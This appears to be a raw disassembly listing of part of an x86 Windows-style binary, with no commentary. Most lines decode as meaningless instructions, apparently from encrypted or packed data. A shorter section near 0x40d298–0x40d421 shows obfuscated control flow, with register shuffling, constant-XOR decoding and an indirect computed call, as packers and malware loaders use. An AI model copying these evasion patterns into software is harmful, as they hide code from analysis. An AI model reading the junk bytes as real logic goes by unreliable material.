  40ce1b:	mov    al,ds:0xd5c1a331
  40ce20:	retf   0xb8c2
  40ce23:	hlt    
  40ce24:	cmc    
  40ce25:	in     al,0x80
  40ce27:	sbb    eax,0x2d82a001
  40ce2c:	fisub  DWORD PTR [edx-0x394057c2]
  40ce32:	pop    ecx
  40ce33:	(bad)  [edi]
  40ce35:	pushf  
  40ce36:	test   cl,0x42
  40ce39:	sub    BYTE PTR [ecx],al
  40ce3b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ce3c:	cmp    eax,0xd988d36f
  40ce41:	xchg   DWORD PTR [edi-0x101cdb1a],esi
  40ce47:	xor    edx,DWORD PTR [edx-0x27d76bea]
  40ce4d:	sub    BYTE PTR [eax],cl
  40ce4f:	test   eax,0xdb8d2bdf
  40ce54:	xor    eax,ebp
  40ce56:	jle    0x40ce8a
  40ce58:	add    dh,BYTE PTR [ecx+0xd2d1843]
  40ce5e:	fbld   TBYTE PTR [esi+eax*8-0x54ec2161]
  40ce65:	add    DWORD PTR [ebx-0x43],edx
  40ce68:	and    al,0x18
  40ce6a:	(bad)  
  40ce6b:	sub    bl,BYTE PTR [esi+0x16]
  40ce6e:	sub    eax,0xd12fea6f
  40ce73:	ds jae 0x40ce15
  40ce76:	leave  
  40ce77:	addr16 add ebx,esp
  40ce7a:	aam    0x57
  40ce7c:	fnstcw WORD PTR [edx+0x5a]
  40ce7f:	scas   al,BYTE PTR es:[edi]
  40ce80:	dec    edx
  40ce81:	jmp    0xeb7d3060
  40ce86:	pop    ebp
  40ce87:	dec    ecx
  40ce88:	add    al,0x96
  40ce8a:	int3   
  40ce8b:	fnstenv [edx+0x65]
  40ce8e:	mov    ebx,0xea1deff6
  40ce93:	out    dx,al
  40ce94:	sub    al,0x9b
  40ce96:	mov    ch,0xd7
  40ce98:	js     0x40ce53
  40ce9a:	sub    DWORD PTR [edi+0x202da007],0xffffffbb
  40cea1:	mov    dh,0x4c
  40cea3:	dec    ebp
  40cea4:	aas    
  40cea5:	sbb    al,0xcf
  40cea7:	xchg   ebx,eax
  40cea8:	scas   eax,DWORD PTR es:[edi]
  40cea9:	rcr    DWORD PTR [eax-0x17],1
  40ceac:	mov    esp,0x49eee944
  40ceb1:	jnp    0x40ce89
  40ceb3:	or     al,BYTE PTR [edi]
  40ceb5:	jl     0x40ce70
  40ceb7:	pop    esi
  40ceb8:	pop    ss
  40ceb9:	or     al,0x1d
  40cebb:	jmp    0x40ce9d
  40cebd:	dec    eax
  40cebe:	jle    0x40cf04
  40cec0:	(bad)  
  40cec1:	or     ebp,esp
  40cec3:	idiv   DWORD PTR [edi+eax*2-0x60]
  40cec7:	(bad)  
  40cec8:	test   DWORD PTR [edx+eax*4+0x3],ebx
  40cecc:	mov    cl,BYTE PTR [esi-0x7f]
  40cecf:	push   cs
  40ced0:	dec    ecx
  40ced1:	dec    ebp
  40ced2:	or     edx,DWORD PTR [ebp-0x50]
  40ced5:	mov    esp,0x572e886d
  40ceda:	fwait
  40cedb:	je     0x40cece
  40cedd:	jns    0x40ce7f
  40cedf:	popf   
  40cee0:	mov    ecx,0x76074df2
  40cee6:	sbb    eax,0x4c79f91e
  40ceeb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ceec:	fnsave [edi-0x1c7fb040]
  40cef2:	cmp    DWORD PTR [edi],edi
  40cef4:	pop    esp
  40cef5:	lods   al,BYTE PTR ds:[esi]
  40cef6:	jp     0x40ced5
  40cef8:	ins    BYTE PTR es:[edi],dx
  40cef9:	xor    BYTE PTR ds:0xc496ca6f,bl
  40ceff:	cwde   
  40cf00:	(bad)  
  40cf01:	cmp    eax,0x461dcf04
  40cf06:	xchg   ebx,eax
  40cf07:	int3   
  40cf08:	ss jmp 0x866b7dbc
  40cf0e:	sub    ch,ah
  40cf10:	sub    al,0xad
  40cf12:	repnz sub DWORD PTR fs:[edx],0x1c80b98c
  40cf1a:	jns    0x40cf6a
  40cf1c:	mov    es,WORD PTR [ecx+0x43]
  40cf1f:	xchg   edi,eax
  40cf20:	std    
  40cf21:	mov    edx,0x3a7150ee
  40cf26:	push   edi
  40cf27:	or     bh,BYTE PTR [edx-0x40959b27]
  40cf2d:	fs inc esp
  40cf2f:	lds    edx,FWORD PTR [edx-0x67]
  40cf32:	or     esi,ebx
  40cf34:	sub    al,BYTE PTR [ebx+0x3514fe47]
  40cf3a:	fimul  WORD PTR [edx-0x9cb5bd2]
  40cf40:	inc    ebx
  40cf41:	adc    BYTE PTR [ebx],bh
  40cf43:	call   0x2790:0xb183ac08
  40cf4a:	ret    0x71a6
  40cf4d:	pusha  
  40cf4e:	and    al,0x9b
  40cf50:	add    dh,dl
  40cf52:	ret    
  40cf53:	inc    esp
  40cf54:	cdq    
  40cf55:	push   ds
  40cf56:	(bad)  
  40cf57:	jg     0x40cef5
  40cf59:	ret    0xab00
  40cf5c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cf5d:	and    DWORD PTR [ecx+0x27],edi
  40cf60:	inc    esp
  40cf61:	mov    ds:0x51f6a690,eax
  40cf66:	cmp    dl,BYTE PTR [ecx-0x3d]
  40cf69:	xor    al,BYTE PTR [edx-0x3703264d]
  40cf6f:	cmp    DWORD PTR [edi],0xc6567454
  40cf75:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cf76:	fild   QWORD PTR [ebp+0x5f63f12b]
  40cf7c:	std    
  40cf7d:	fimul  DWORD PTR [ebp-0x3e4c8c80]
  40cf83:	addr16 rcl esi,0xf8
  40cf87:	stos   BYTE PTR es:[edi],al
  40cf88:	and    eax,0xe4e30f2a
  40cf8d:	mov    edx,0x985e73dd
  40cf92:	nop
  40cf93:	jb     0x40d00c
  40cf95:	sti    
  40cf96:	jecxz  0x40cfe7
  40cf98:	sbb    al,0x1c
  40cf9a:	jnp    0x40cf94
  40cf9c:	pop    ss
  40cf9d:	int    0xa3
  40cf9f:	add    al,0x36
  40cfa1:	or     ah,BYTE PTR [eax+0x327c552e]
  40cfa7:	cmp    eax,0x69b9adfc
  40cfac:	das    
  40cfad:	adc    BYTE PTR [esi],dh
  40cfaf:	push   esi
  40cfb0:	aas    
  40cfb1:	addr16 add eax,0x5cbca08c
  40cfb7:	cwde   
  40cfb8:	dec    eax
  40cfb9:	bound  ebp,QWORD PTR ds:0xd1e6d8ab
  40cfbf:	test   eax,0xd30110db
  40cfc4:	outs   dx,DWORD PTR ds:[esi]
  40cfc5:	popa   
  40cfc6:	aad    0x27
  40cfc8:	addr16 dec ebx
  40cfca:	xchg   esi,eax
  40cfcb:	add    al,0x7b
  40cfcd:	dec    ebx
  40cfce:	fcom   QWORD PTR [eax+0x6]
  40cfd1:	pusha  
  40cfd2:	ss std 
  40cfd4:	(bad)  
  40cfd5:	mov    WORD PTR [ecx+0x59a833be],gs
  40cfdb:	popa   
  40cfdc:	and    DWORD PTR [ecx+ebp*8],edi
  40cfdf:	fdivr  st(2),st
  40cfe1:	or     eax,0x561c426b
  40cfe6:	sti    
  40cfe7:	ret    
  40cfe8:	or     ebx,DWORD PTR [ebx]
  40cfea:	js     0x40cfdc
  40cfec:	adc    al,0xf0
  40cfee:	js     0x40cf70
  40cff0:	retf   0xdddb
  40cff3:	frndint 
  40cff5:	and    BYTE PTR [ebp+0x1b],bl
  40cff8:	cdq    
  40cff9:	ss jle 0x40cfc2
  40cffc:	sub    DWORD PTR [esi],esp
  40cffe:	mov    bl,0x29
  40d000:	jno    0x40cf89
  40d002:	call   0x310f33ba
  40d007:	lods   al,BYTE PTR ds:[esi]
  40d008:	hlt    
  40d009:	out    dx,al
  40d00a:	jae    0x40cfa7
  40d00c:	fidivr DWORD PTR [ebx-0x70]
  40d00f:	sub    al,0x2e
  40d011:	int    0xee
  40d013:	mov    bl,0x35
  40d015:	out    dx,al
  40d016:	mov    eax,ds:0xec4a06cf
  40d01b:	mov    esp,0x20d1cbd6
  40d020:	pop    ds
  40d021:	loop   0x40d05f
  40d023:	es clc 
  40d025:	xor    bl,BYTE PTR [ebx-0xddd6528]
  40d02b:	fisubr WORD PTR [eax+ecx*4]
  40d02e:	fsubr  st,st(2)
  40d030:	mov    edi,DWORD PTR [edx+0x7958c1c5]
  40d036:	mov    ecx,0x1fc55658
  40d03b:	ret    0x55a4
  40d03e:	(bad)  [edi+ebp*8+0x75162dfb]
  40d045:	and    ch,BYTE PTR [ebx-0x4be7cf24]
  40d04b:	popa   
  40d04c:	out    0x89,eax
  40d04e:	xor    DWORD PTR [edx],ecx
  40d050:	jo     0x40d07b
  40d052:	arpl   WORD PTR [ebp+0x79],cx
  40d055:	pop    es
  40d056:	test   DWORD PTR [esi-0x67a2e695],0x4dfae61e
  40d060:	xchg   edx,eax
  40d061:	outs   dx,DWORD PTR ds:[esi]
  40d062:	mov    BYTE PTR [ecx+0x76],cl
  40d065:	aam    0xf3
  40d067:	jmp    0x40d0ba
  40d069:	jg     0x40d098
  40d06b:	cmp    BYTE PTR [edi+0x77a543f],0x7a
  40d072:	mov    ds:0x4fdfe8de,al
  40d077:	dec    ebp
  40d078:	iret   
  40d079:	add    ebx,DWORD PTR [ecx]
  40d07b:	push   ebx
  40d07c:	cwde   
  40d07d:	adc    eax,0x5f4249fa
  40d082:	retw   
  40d084:	cmp    BYTE PTR [edx+0x45],bh
  40d087:	int    0xd6
  40d089:	xlat   BYTE PTR ds:[ebx]
  40d08a:	loope  0x40d103
  40d08c:	daa    
  40d08d:	and    esp,0x3d
  40d090:	jl     0x40d02e
  40d092:	add    eax,0x4fbad497
  40d097:	cwde   
  40d098:	neg    DWORD PTR [ebx]
  40d09a:	hlt    
  40d09b:	cdq    
  40d09c:	aas    
  40d09d:	push   esp
  40d09e:	jecxz  0x40d0b4
  40d0a0:	in     eax,0xc5
  40d0a2:	pop    eax
  40d0a3:	lods   al,BYTE PTR ds:[esi]
  40d0a4:	push   ecx
  40d0a5:	js     0x40d09c
  40d0a7:	sbb    eax,0x68a7fe69
  40d0ac:	imul   esp,DWORD PTR [ecx],0x97b67f45
  40d0b2:	test   DWORD PTR [esi-0x7a],0x3f5cc365
  40d0b9:	rcl    BYTE PTR [eax-0x7c],1
  40d0bc:	rol    cl,0x87
  40d0bf:	xchg   esi,eax
  40d0c0:	add    ebp,DWORD PTR [esi]
  40d0c2:	(bad)  
  40d0c4:	test   bh,ch
  40d0c6:	sbb    DWORD PTR [ebp+0x0],esi
  40d0c9:	daa    
  40d0ca:	test   al,0x6c
  40d0cc:	mov    esp,0x9930f26b
  40d0d1:	btc    DWORD PTR [ebp+ebx*2+0x3688e277],ecx
  40d0d9:	pushf  
  40d0da:	aas    
  40d0db:	dec    esp
  40d0dc:	cmc    
  40d0dd:	or     eax,0xec3518c0
  40d0e2:	or     DWORD PTR [edi+eiz*1+0x54305686],ecx
  40d0e9:	retf   0x3d26
  40d0ec:	jecxz  0x40d118
  40d0ee:	add    DWORD PTR [esi+0x15],ecx
  40d0f1:	ror    BYTE PTR [esi-0x28],0x88
  40d0f5:	test   eax,0xc1eb41bb
  40d0fa:	jl     0x40d167
  40d0fc:	xchg   esi,eax
  40d0fd:	sub    bl,ch
  40d0ff:	outs   dx,DWORD PTR ds:[esi]
  40d100:	push   ebp
  40d101:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d102:	out    dx,eax
  40d103:	cmp    ch,ah
  40d105:	jp     0x40d0ed
  40d107:	(bad)  
  40d108:	mov    ecx,0x47087503
  40d10d:	lea    esi,[eax]
  40d10f:	xor    BYTE PTR [edi-0x54fdc065],ah
  40d115:	adc    ch,BYTE PTR [edi]
  40d117:	dec    ebp
  40d118:	cmc    
  40d119:	enter  0x33be,0xe7
  40d11d:	mov    ecx,0x37887156
  40d122:	mov    ebx,0x33f6821
  40d127:	(bad)
  40d12a:	pop    edx
  40d12b:	pop    ebx
  40d12c:	jae    0x40d115
  40d12e:	aam    0x5b
  40d130:	es cwde 
  40d132:	pop    ss
  40d133:	or     DWORD PTR [ebp-0x65],ecx
  40d136:	test   ch,al
  40d138:	xchg   edx,esp
  40d13a:	pop    esp
  40d13b:	and    eax,DWORD PTR ds:0x7728d3a9
  40d141:	ins    DWORD PTR es:[edi],dx
  40d142:	mov    al,ds:0xc5cb7986
  40d147:	scas   eax,DWORD PTR es:[edi]
  40d148:	inc    eax
  40d149:	sahf   
  40d14a:	sbb    al,0xec
  40d14c:	mov    esp,0xbf61b4f5
  40d151:	popa   
  40d152:	xchg   esi,eax
  40d153:	lods   al,BYTE PTR ds:[esi]
  40d154:	xchg   esp,eax
  40d155:	lock loop 0x40d19a
  40d158:	ins    DWORD PTR es:[edi],dx
  40d159:	scas   eax,DWORD PTR es:[edi]
  40d15a:	out    0x1b,al
  40d15c:	ins    BYTE PTR es:[edi],dx
  40d15d:	in     al,dx
  40d15e:	cdq    
  40d15f:	push   esp
  40d160:	jne    0x40d16b
  40d162:	inc    esp
  40d163:	out    dx,eax
  40d164:	arpl   WORD PTR [edx-0x11],bp
  40d167:	jb     0x40d14d
  40d169:	(bad)
  40d16e:	push   0x7e8b5e71
  40d173:	push   0xebb601e0
  40d178:	cmp    ch,ah
  40d17a:	call   0x1f86fffc
  40d17f:	add    DWORD PTR [edx],0xa5337005
  40d185:	cli    
  40d186:	add    BYTE PTR [ecx+eiz*2+0x12],cl
  40d18a:	popa   
  40d18b:	stos   DWORD PTR es:[edi],eax
  40d18c:	adc    al,0x60
  40d18e:	cdq    
  40d18f:	dec    ebx
  40d190:	rcl    DWORD PTR [ecx-0x619e5317],cl
  40d196:	dec    ebp
  40d197:	inc    esp
  40d198:	mov    BYTE PTR [ebx+edx*1+0x7ddc92e],dh
  40d19f:	sbb    DWORD PTR [ebp+ecx*2-0xc02a482],esp
  40d1a6:	adc    eax,0xdea029ec
  40d1ab:	sub    al,0x8b
  40d1ad:	daa    
  40d1ae:	popa   
  40d1af:	dec    edi
  40d1b0:	lea    ebp,[ebx+0x64]
  40d1b3:	lds    edi,FWORD PTR [ebp-0x7ec5cc5c]
  40d1b9:	and    DWORD PTR [esi+0x36],0xa2ba8549
  40d1c0:	out    dx,al
  40d1c1:	mov    DWORD PTR [ebp-0xdd1ceb8],ebx
  40d1c7:	popf   
  40d1c8:	xchg   ebp,eax
  40d1c9:	jne    0x40d1f3
  40d1cb:	jmp    0xfb199e9f
  40d1d0:	ret    0x819d
  40d1d3:	stc    
  40d1d4:	sbb    ch,BYTE PTR [edi]
  40d1d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d1d7:	sahf   
  40d1d8:	adc    eax,0xb329525
  40d1dd:	fdiv   QWORD PTR [ebx+0x58]
  40d1e0:	inc    ebx
  40d1e1:	mov    dl,0x82
  40d1e3:	fdivr  st,st(4)
  40d1e5:	in     eax,0x26
  40d1e7:	shl    ch,1
  40d1e9:	out    0xaa,al
  40d1eb:	mov    eax,0xe3bf3575
  40d1f0:	pop    eax
  40d1f1:	jbe    0x40d1db
  40d1f3:	pop    ebx
  40d1f4:	in     al,0x77
  40d1f6:	or     DWORD PTR [eax+0x49b30219],esi
  40d1fc:	int    0xdc
  40d1fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d1ff:	cmp    ah,0x95
  40d202:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d203:	push   esi
  40d204:	sub    edx,0xcd3768bb
  40d20a:	sub    ebx,0x502b979d
  40d210:	xchg   esi,eax
  40d211:	push   edx
  40d212:	loope  0x40d1b6
  40d214:	ins    DWORD PTR es:[edi],dx
  40d215:	push   esi
  40d216:	add    al,0x5d
  40d218:	xchg   edi,eax
  40d219:	ror    BYTE PTR [ecx],1
  40d21b:	ror    DWORD PTR ds:0xf71fc484,1
  40d221:	xchg   esi,eax
  40d222:	mov    al,0x4
  40d224:	dec    ecx
  40d225:	jae    0x40d1a7
  40d227:	xor    eax,0x8594a757
  40d22c:	das    
  40d22d:	dec    eax
  40d22e:	hlt    
  40d22f:	xor    bl,0x38
  40d232:	ins    BYTE PTR es:[edi],dx
  40d233:	sbb    DWORD PTR [ebx-0x15f3d640],ebp
  40d239:	push   esp
  40d23a:	mov    ah,0x1
  40d23c:	pushf  
  40d23d:	push   ebp
  40d23e:	test   DWORD PTR [ebp+0x74],ecx
  40d241:	into   
  40d242:	repnz add al,0x1d
  40d245:	ss jp  0x40d266
  40d248:	sbb    al,0xd2
  40d24a:	mov    eax,ds:0x7d83c7f
  40d24f:	sbb    eax,0x54
  40d252:	push   ds
  40d253:	ror    BYTE PTR [eax-0x50],1
  40d256:	in     eax,dx
  40d257:	into   
  40d258:	xchg   esi,edx
  40d25a:	push   edx
  40d25b:	arpl   WORD PTR [edi+0x25b0299f],dx
  40d261:	outs   dx,DWORD PTR ds:[esi]
  40d262:	ins    BYTE PTR es:[edi],dx
  40d263:	push   ebp
  40d264:	push   ebp
  40d265:	js     0x40d22a
  40d267:	cdq    
  40d268:	fild   DWORD PTR [eax+0x7314a90f]
  40d26e:	sbb    eax,0x37131b8a
  40d273:	fbstp  TBYTE PTR [edx-0x12]
  40d276:	pop    eax
  40d277:	pushf  
  40d278:	rol    DWORD PTR [edx-0x67],cl
  40d27b:	inc    eax
  40d27c:	loope  0x40d200
  40d27e:	push   ds
  40d27f:	aas    
  40d280:	push   edi
  40d281:	mov    edi,edx
  40d283:	mov    eax,0xc752dc63
  40d288:	mov    dh,0xb5
  40d28a:	push   ebp
  40d28b:	sbb    BYTE PTR [ecx-0x57],0xe2
  40d28f:	dec    edi
  40d290:	push   esi
  40d291:	pop    ebx
  40d292:	out    dx,eax
  40d293:	push   eax
  40d294:	inc    esi
  40d295:	add    BYTE PTR [ebx],bh
  40d297:	iret   
  40d298:	mov    eax,DWORD PTR [ebp-0x1c]
  40d29b:	test   eax,eax
  40d29d:	je     0x40d339
  40d2a3:	mov    DWORD PTR [ebp-0x20],0x0
  40d2aa:	push   edx
  40d2ab:	pop    eax
  40d2ac:	push   0x5
  40d2ae:	sub    edx,eax
  40d2b0:	pop    edx
  40d2b1:	add    edx,0xa
  40d2b4:	push   edx
  40d2b5:	pop    ecx
  40d2b6:	push   0xa
  40d2b8:	dec    ecx
  40d2b9:	pop    ebx
  40d2ba:	dec    ebx
  40d2bb:	xchg   ebx,ecx
  40d2bd:	sub    ebx,ecx
  40d2bf:	xchg   ebx,ecx
  40d2c1:	dec    ecx
  40d2c2:	mov    eax,DWORD PTR [ebp-0x1c]
  40d2c5:	imul   eax,ecx
  40d2c8:	sub    esp,eax
  40d2ca:	mov    DWORD PTR [ebp-0x20],esp
  40d2cd:	mov    eax,DWORD PTR [ebp-0x4]
  40d2d0:	xor    eax,esi
  40d2d2:	add    eax,edi
  40d2d4:	jmp    0x40d312
  40d2d9:	mov    ecx,DWORD PTR [ebp-0xc]
  40d2dc:	mov    eax,DWORD PTR [ebp+0x8]
  40d2df:	mov    edx,DWORD PTR [ebp+0x14]
  40d2e2:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  40d2e6:	xor    ecx,esi
  40d2e8:	add    ecx,edi
  40d2ea:	xor    edx,edx
  40d2ec:	div    ecx
  40d2ee:	mov    ecx,DWORD PTR [ebp-0x4]
  40d2f1:	xor    ecx,esi
  40d2f3:	lea    eax,[ecx+eax*1+0x3272fa]
  40d2fa:	mov    ecx,DWORD PTR [ebp+0x8]
  40d2fd:	mov    edx,DWORD PTR [ebp-0x20]
  40d300:	mov    DWORD PTR [edx+ecx*4],eax
  40d303:	mov    eax,DWORD PTR [ebp-0xc]
  40d306:	mov    ecx,DWORD PTR [ebp+0x8]
  40d309:	xor    eax,esi
  40d30b:	lea    eax,[eax+ecx*1+0x3272fa]
  40d312:	mov    DWORD PTR [ebp+0x8],eax
  40d315:	mov    eax,DWORD PTR [ebp-0xc]
  40d318:	mov    ecx,DWORD PTR [ebp+0x14]
  40d31b:	xor    eax,esi
  40d31d:	add    eax,edi
  40d31f:	imul   eax,DWORD PTR [ecx]
  40d322:	mov    ecx,DWORD PTR [ebp-0x4]
  40d325:	mov    edx,DWORD PTR [ebp+0x8]
  40d328:	xor    ecx,esi
  40d32a:	lea    ecx,[ecx+edx*1+0x3272fa]
  40d331:	cmp    ecx,eax
  40d333:	jne    0x40d2d9
  40d339:	mov    eax,DWORD PTR [ebp-0x4]
  40d33c:	xor    eax,esi
  40d33e:	add    eax,edi
  40d340:	mov    DWORD PTR [ebp-0x10],eax
  40d343:	and    ebx,0x6547647
  40d349:	xor    ebx,0x8768765
  40d34f:	xchg   ebx,esi
  40d351:	xor    ebx,ebx
  40d353:	push   esi
  40d354:	mov    esi,ebx
  40d356:	pop    ebx
  40d357:	mov    edx,esi
  40d359:	add    ebx,0x1002
  40d35f:	lea    eax,[ebp-0x18]
  40d362:	add    edx,eax
  40d364:	add    edx,0x5
  40d367:	push   edx
  40d368:	inc    esi
  40d369:	pop    ecx
  40d36a:	dec    ecx
  40d36b:	xchg   ecx,eax
  40d36c:	dec    eax
  40d36d:	xchg   ecx,eax
  40d36e:	dec    ecx
  40d36f:	xchg   ecx,edx
  40d371:	dec    edx
  40d372:	push   edx
  40d373:	mov    edx,ebx
  40d375:	pop    ebx
  40d376:	dec    ebx
  40d377:	call   DWORD PTR [ebx]
  40d379:	cmp    DWORD PTR [ebp+0x10],esi
  40d37c:	je     0x40d39d
  40d382:	xchg   edx,eax
  40d383:	push   0xc
  40d385:	pop    ecx
  40d386:	dec    ecx
  40d387:	push   0x3
  40d389:	pop    ebx
  40d38a:	inc    ebx
  40d38b:	xchg   ebx,ecx
  40d38d:	inc    ecx
  40d38e:	sub    ebx,ecx
  40d390:	xchg   ebx,ecx
  40d392:	dec    ecx
  40d393:	dec    ecx
  40d394:	mov    eax,DWORD PTR [ebp-0x1c]
  40d397:	imul   eax,ecx
  40d39a:	add    esp,eax
  40d39c:	xchg   edx,eax
  40d39d:	push   eax
  40d39e:	xor    ebx,ebx
  40d3a0:	mov    edx,esp
  40d3a2:	dec    edx
  40d3a3:	inc    ebx
  40d3a4:	add    ebx,DWORD PTR [edx+ebx*1]
  40d3a7:	dec    ebx
  40d3a8:	xor    edx,edx
  40d3aa:	add    DWORD PTR [ebp-0x10],ebx
  40d3ad:	pop    ebx
  40d3ae:	mov    eax,DWORD PTR [ebp-0x10]
  40d3b1:	pop    edi
  40d3b2:	pop    esi
  40d3b3:	pop    ebx
  40d3b4:	leave  
  40d3b5:	ret    0x10
  40d3b8:	push   ebp
  40d3b9:	mov    ebp,esp
  40d3bb:	push   ecx
  40d3bc:	or     DWORD PTR ds:0x426f29,0x4a1b
  40d3c6:	mov    DWORD PTR [ebp-0x4],0xf89c85b9
  40d3cd:	movzx  edx,BYTE PTR ds:0x426f19
  40d3d4:	sub    DWORD PTR ds:0x426f21,edx
  40d3da:	mov    eax,DWORD PTR [ebp-0x4]
  40d3dd:	mov    DWORD PTR ds:0x426e91,0x1a
  40d3e7:	cmp    DWORD PTR ds:0x426e91,0x0
  40d3ee:	je     0x40d421
  40d3f4:	cmp    DWORD PTR ds:0x426e91,0x24
  40d3fb:	jl     0x40d421
  40d401:	jmp    0x40d40f
  40d406:	push   DWORD PTR [ebp-0xc]
  40d409:	call   DWORD PTR ds:0x42fa2c
  40d40f:	mov    edx,DWORD PTR ds:0x426e91
  40d415:	dec    edx
  40d416:	mov    DWORD PTR ds:0x426e91,edx
  40d41c:	jmp    0x40d3e7
  40d421:	mov    edx,DWORD PTR [ebp+0x10]
  40d424:	xor    ecx,0x6edc
  40d42a:	jmp    0x40f7c6
  40d42f:	mov    ah,0x4a
  40d431:	hlt    
  40d432:	mov    ebx,0x74b46574
  40d437:	ja     0x40d48b
  40d439:	out    dx,al
  40d43a:	je     0x40d400
  40d43c:	mov    edi,0x2a1a042d
  40d441:	jnp    0x40d4be
  40d443:	clc    
  40d444:	pushf  
  40d445:	jnp    0x40d4c2
  40d447:	push   esp
  40d448:	xchg   ecx,eax
  40d449:	xor    ebx,DWORD PTR ds:0xb2d46f56
  40d44f:	inc    ebx
  40d450:	fidivr WORD PTR [esi]
  40d452:	mov    ds:0xec1965de,al
  40d457:	test   ah,dl
  40d459:	das    
  40d45a:	push   esi
  40d45b:	popf   
  40d45c:	fdivr  st(2),st
  40d45e:	retf   0x7321
  40d461:	sbb    al,0xc2
  40d463:	leave  
  40d464:	mov    ebx,0x7977fbc0
  40d469:	nop
  40d46a:	scas   eax,DWORD PTR es:[edi]
  40d46b:	and    eax,0x40461905
  40d470:	popf   
  40d471:	outs   dx,BYTE PTR ds:[esi]
  40d472:	mov    BYTE PTR [ebx],dl
  40d474:	mov    dl,0xa5
  40d476:	mov    ch,0x2e
  40d478:	es popf 
  40d47a:	adc    eax,0x10700c75
  40d47f:	pusha  
  40d480:	sub    eax,0x377faecb
  40d485:	ret    
  40d486:	aam    0x7b
  40d488:	popa   
  40d489:	pusha  
  40d48a:	jmp    0x40d436
  40d48c:	sub    eax,DWORD PTR [esi+0x4ebf6fe9]
  40d492:	cmp    eax,DWORD PTR [ecx+0x78]
  40d495:	out    0xce,eax
  40d497:	adc    al,0x9f
  40d499:	pusha  
  40d49a:	dec    esp
  40d49b:	and    bl,BYTE PTR [ebx]
  40d49d:	or     dl,ah
  40d49f:	lods   al,BYTE PTR ds:[esi]
  40d4a0:	jmp    0x40d51f
  40d4a2:	loope  0x40d457
  40d4a4:	call   FWORD PTR [ecx+0x5e84fc4a]
  40d4aa:	sbb    BYTE PTR [edi-0x5abb481b],0x7b
  40d4b1:	retf   0x72de
  40d4b4:	mov    edi,ecx
  40d4b6:	lock mov ebp,0x7d608b10
  40d4bc:	sahf   
  40d4bd:	fdiv   DWORD PTR [ebx-0x32]
  40d4c0:	xchg   esi,eax
  40d4c1:	push   ebx
  40d4c2:	xchg   ecx,eax
  40d4c3:	int    0x4d
  40d4c5:	(bad)  
  40d4c6:	test   eax,0x18345314
  40d4cb:	ins    DWORD PTR es:[edi],dx
  40d4cc:	cmp    esi,DWORD PTR [edx+ecx*8-0x32]
  40d4d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d4d1:	add    BYTE PTR [esi],bl
  40d4d3:	shr    BYTE PTR [edx],1
  40d4d5:	sahf   
  40d4d6:	enter  0x1176,0x37
  40d4da:	rol    DWORD PTR gs:[eax+0xa4a049e],0x39
  40d4e2:	cmp    BYTE PTR [edi],bh
  40d4e4:	call   0xe126c7d9
  40d4e9:	js     0x40d48f
  40d4eb:	mov    dl,0x5d
  40d4ed:	mov    bh,0xd7
  40d4ef:	daa    
  40d4f0:	xor    DWORD PTR [ebx+edx*8-0x56],ebp
  40d4f4:	xchg   ebp,eax
  40d4f5:	add    BYTE PTR [ecx+0x177fd259],0x15
  40d4fc:	mov    ch,0xe1
  40d4fe:	dec    edi
  40d4ff:	aad    0x0
  40d501:	std    
  40d502:	aas    
  40d503:	shr    BYTE PTR [eax-0x52],0xa5
  40d507:	mov    ds:0xdead36f2,eax
  40d50c:	cli    
  40d50d:	cmc    
  40d50e:	pop    esp
  40d50f:	xchg   edi,eax
  40d510:	adc    al,0xf1
  40d512:	add    ecx,ebx
  40d514:	jae    0x40d4a3
  40d516:	inc    ebx
  40d517:	lods   al,BYTE PTR ds:[esi]
  40d518:	dec    edx
  40d519:	add    eax,0x17b38c18
  40d51e:	popf   
  40d51f:	jns    0x40d554
  40d521:	retf   
  40d522:	neg    BYTE PTR [ebp+0x8]
  40d525:	mov    al,0x36
  40d527:	sbb    ebp,DWORD PTR ds:0x8b0ba89c
  40d52d:	iret   
  40d52e:	mov    gs,WORD PTR [esi]
  40d530:	(bad)  
  40d531:	mov    ebx,0xd87e1173
  40d536:	cs jmp 0x82d0:0x4c564839
  40d53e:	push   cs
  40d53f:	scas   al,BYTE PTR es:[edi]
  40d540:	mov    cl,BYTE PTR [ebx]
  40d542:	lds    eax,FWORD PTR [ebx]
  40d544:	loop   0x40d596
  40d546:	jge    0x40d51a
  40d548:	lods   al,BYTE PTR ds:[esi]
  40d549:	sbb    DWORD PTR [ebx+0x35],eax
  40d54c:	es jge 0x40d505
  40d54f:	cli    
  40d550:	and    DWORD PTR [edi],ecx
  40d552:	inc    eax
  40d553:	int3   
  40d554:	push   edi
  40d555:	pusha  
  40d556:	fidivr DWORD PTR [edi+eax*2+0x6759a095]
  40d55d:	push   edx
  40d55e:	test   al,0xd6
  40d560:	test   ch,cl
  40d562:	cmp    al,0xd7
  40d564:	adc    eax,0x2c6ed78
  40d569:	sti    
  40d56a:	push   esi
  40d56b:	add    BYTE PTR [ebx+0x45],dl
  40d56e:	aas    
  40d56f:	data16 cmp BYTE PTR [ebx+0x22],al
  40d573:	(bad)  
  40d574:	scas   eax,DWORD PTR es:[edi]
  40d575:	dec    edi
  40d576:	xor    eax,0xf9efe381
  40d57b:	jno    0x40d556
  40d57d:	sbb    ah,BYTE PTR [ecx+0x6]
  40d580:	pushf  
  40d581:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d582:	jecxz  0x40d59a
  40d584:	aaa    
  40d585:	out    dx,eax
  40d586:	ret    
  40d587:	mov    ds:0xd4ff3dcd,al
  40d58c:	mov    eax,DWORD PTR [ebx]
  40d58e:	popf   
  40d58f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d590:	mov    WORD PTR [esi],?
  40d592:	pushf  
  40d593:	shl    DWORD PTR [edx+0x70],0x9
  40d597:	mov    dh,0x4b
  40d599:	out    dx,al
  40d59a:	in     eax,0xaf
  40d59c:	lock rcl ecx,cl
  40d59f:	push   ds
  40d5a0:	aas    
  40d5a1:	out    dx,al
  40d5a2:	xor    eax,0x8d3196fa
  40d5a7:	call   0xb05e20bc
  40d5ac:	push   ebp
  40d5ad:	jle    0x40d60b
